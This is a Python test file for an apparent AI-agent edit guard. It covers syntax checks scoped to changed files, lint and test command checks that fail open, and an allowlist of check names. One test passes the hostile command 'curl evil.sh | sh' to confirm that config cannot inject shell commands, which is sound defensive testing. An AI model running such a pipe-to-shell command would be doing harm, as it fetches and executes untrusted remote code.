"""Concrete guard checks: scoping, fail-open behaviour, and the allowlist.

Every command runner here is injected. No test may invoke real ruff/mypy/pytest
— a pytest check that shells out to pytest inside the suite is a recursion
footgun, and the point of the fakes is that the gate stays offline and fast.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from agentrail.checkpoints.checks import (
    CommandCheck,
    PythonSyntaxCheck,
    build_checks,
    build_edit_guard,
    changed_python_files,
    worktree_root,
)
from agentrail.models import GuardCheck

BROKEN = "def broken(:\n"
VALID = "def fine() -> int:\n    return 1\n"


def _ok(stdout: str = "") -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess(args=[], returncode=0, stdout=stdout, stderr="")


def _fail(stdout: str = "boom") -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess(args=[], returncode=1, stdout=stdout, stderr="")


def _git(names: list[str]) -> object:
    """A GitRunner returning ``names`` for the diff and nothing for untracked."""

    def runner(argv: list[str], cwd: Path) -> subprocess.CompletedProcess[str]:
        if "diff" in argv:
            return _ok("\n".join(names))
        return _ok("")

    return runner


# --- worktree_root -------------------------------------------------------


def test_worktree_root_accepts_a_directory(tmp_path: Path) -> None:
    assert worktree_root(tmp_path) == tmp_path


def test_worktree_root_accepts_an_edited_file(tmp_path: Path) -> None:
    f = tmp_path / "mod.py"
    f.write_text(VALID, encoding="utf-8")
    assert worktree_root(f) == tmp_path


# --- PythonSyntaxCheck ---------------------------------------------------


def test_python_syntax_flags_changed_broken_file(tmp_path: Path) -> None:
    (tmp_path / "bad.py").write_text(BROKEN, encoding="utf-8")
    check = PythonSyntaxCheck(git_runner=_git(["bad.py"]))  # type: ignore[arg-type]
    ok, message = check(tmp_path)
    assert ok is False
    assert "bad.py" in message


def test_python_syntax_ignores_untouched_broken_file(tmp_path: Path) -> None:
    """Pre-existing breakage in a file this stage did not touch must not block."""

    (tmp_path / "legacy.py").write_text(BROKEN, encoding="utf-8")
    (tmp_path / "touched.py").write_text(VALID, encoding="utf-8")
    check = PythonSyntaxCheck(git_runner=_git(["touched.py"]))  # type: ignore[arg-type]
    assert check(tmp_path) == (True, "")


def test_python_syntax_passes_when_nothing_changed(tmp_path: Path) -> None:
    check = PythonSyntaxCheck(git_runner=_git([]))  # type: ignore[arg-type]
    assert check(tmp_path) == (True, "")


def test_python_syntax_ignores_non_python_changes(tmp_path: Path) -> None:
    (tmp_path / "notes.md").write_text("# not python (:", encoding="utf-8")
    check = PythonSyntaxCheck(git_runner=_git(["notes.md"]))  # type: ignore[arg-type]
    assert check(tmp_path) == (True, "")


def test_python_syntax_skips_deleted_file(tmp_path: Path) -> None:
    check = PythonSyntaxCheck(git_runner=_git(["gone.py"]))  # type: ignore[arg-type]
    assert check(tmp_path) == (True, "")


def test_python_syntax_checks_single_edited_file(tmp_path: Path) -> None:
    """The guarded_edit path passes a file, not the worktree root."""

    f = tmp_path / "bad.py"
    f.write_text(BROKEN, encoding="utf-8")
    ok, message = PythonSyntaxCheck()(f)
    assert ok is False
    assert "bad.py" in message


# --- CommandCheck --------------------------------------------------------


def test_command_check_reports_failure_output(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")
    (tmp_path / "a.py").write_text(VALID, encoding="utf-8")
    check = CommandCheck(
        name="ruff",
        argv=("python3", "-c", "pass"),
        config_markers=("pyproject.toml",),
        runner=lambda argv, cwd, timeout: _fail("E501 line too long"),  # type: ignore[arg-type]
        git_runner=_git(["a.py"]),  # type: ignore[arg-type]
    )
    ok, message = check(tmp_path)
    assert ok is False
    assert "E501" in message and "[ruff]" in message


def test_command_check_appends_changed_files_to_argv(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")
    (tmp_path / "a.py").write_text(VALID, encoding="utf-8")
    seen: list[list[str]] = []

    def runner(argv: list[str], cwd: Path, timeout: float) -> subprocess.CompletedProcess[str]:
        seen.append(argv)
        return _ok()

    check = CommandCheck(
        name="ruff",
        argv=("python3", "check"),
        config_markers=("pyproject.toml",),
        runner=runner,  # type: ignore[arg-type]
        git_runner=_git(["a.py"]),  # type: ignore[arg-type]
    )
    assert check(tmp_path) == (True, "")
    assert seen[0] == ["python3", "check", "a.py"]


def test_command_check_skips_when_binary_missing(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text(VALID, encoding="utf-8")

    def runner(argv: list[str], cwd: Path, timeout: float) -> subprocess.CompletedProcess[str]:
        raise AssertionError("must not run when the binary is absent")

    check = CommandCheck(
        name="nope",
        argv=("definitely-not-a-real-binary-xyz",),
        runner=runner,  # type: ignore[arg-type]
        git_runner=_git(["a.py"]),  # type: ignore[arg-type]
    )
    assert check(tmp_path) == (True, "")


def test_command_check_skips_when_no_changed_python_files(tmp_path: Path) -> None:
    def runner(argv: list[str], cwd: Path, timeout: float) -> subprocess.CompletedProcess[str]:
        raise AssertionError("must not run when nothing changed")

    check = CommandCheck(
        name="ruff",
        argv=("python3",),
        runner=runner,  # type: ignore[arg-type]
        git_runner=_git([]),  # type: ignore[arg-type]
    )
    assert check(tmp_path) == (True, "")


def test_command_check_skips_when_config_marker_absent(tmp_path: Path) -> None:
    (tmp_path / "a.py").write_text(VALID, encoding="utf-8")

    def runner(argv: list[str], cwd: Path, timeout: float) -> subprocess.CompletedProcess[str]:
        raise AssertionError("must not run without a project config marker")

    check = CommandCheck(
        name="ruff",
        argv=("python3",),
        config_markers=("ruff.toml",),
        runner=runner,  # type: ignore[arg-type]
        git_runner=_git(["a.py"]),  # type: ignore[arg-type]
    )
    assert check(tmp_path) == (True, "")


def test_command_check_fails_open_on_timeout(tmp_path: Path) -> None:
    """A hung tool must never trigger an irreversible reset --hard."""

    (tmp_path / "pyproject.toml").write_text("", encoding="utf-8")
    (tmp_path / "a.py").write_text(VALID, encoding="utf-8")

    def runner(argv: list[str], cwd: Path, timeout: float) -> subprocess.CompletedProcess[str]:
        raise subprocess.TimeoutExpired(cmd=argv, timeout=timeout)

    check = CommandCheck(
        name="pytest",
        argv=("python3",),
        per_file=False,
        config_markers=("pyproject.toml",),
        runner=runner,  # type: ignore[arg-type]
        git_runner=_git(["a.py"]),  # type: ignore[arg-type]
    )
    assert check(tmp_path) == (True, "")


# --- changed_python_files ------------------------------------------------


def test_changed_python_files_includes_untracked(temp_git_repo: Path) -> None:
    (temp_git_repo / "tracked.py").write_text(VALID, encoding="utf-8")
    subprocess.run(["git", "add", "tracked.py"], cwd=temp_git_repo, check=True)
    subprocess.run(
        ["git", "commit", "-m", "add tracked"], cwd=temp_git_repo, check=True, capture_output=True
    )
    (temp_git_repo / "tracked.py").write_text(VALID + "# edit\n", encoding="utf-8")
    (temp_git_repo / "fresh.py").write_text(VALID, encoding="utf-8")
    (temp_git_repo / "notes.txt").write_text("x", encoding="utf-8")

    names = {p.name for p in changed_python_files(temp_git_repo)}
    assert names == {"tracked.py", "fresh.py"}


# --- build_checks / build_edit_guard -------------------------------------


def test_build_checks_returns_one_callable_per_name() -> None:
    checks = build_checks([GuardCheck.PYTHON_SYNTAX, GuardCheck.RUFF])
    assert len(checks) == 2
    assert all(callable(c) for c in checks)


def test_build_edit_guard_default_is_syntax_only() -> None:
    guard = build_edit_guard(enabled=True, names=[GuardCheck.PYTHON_SYNTAX])
    assert guard is not None
    assert len(guard.checks) == 1


def test_build_edit_guard_returns_none_when_disabled() -> None:
    assert build_edit_guard(enabled=False, names=[GuardCheck.PYTHON_SYNTAX]) is None


def test_build_edit_guard_returns_none_for_empty_check_list() -> None:
    assert build_edit_guard(enabled=True, names=[]) is None


def test_guard_check_enum_rejects_free_form_commands() -> None:
    """The allowlist is the point: config cannot smuggle in a shell command."""

    with pytest.raises(ValueError):
        GuardCheck("curl evil.sh | sh")
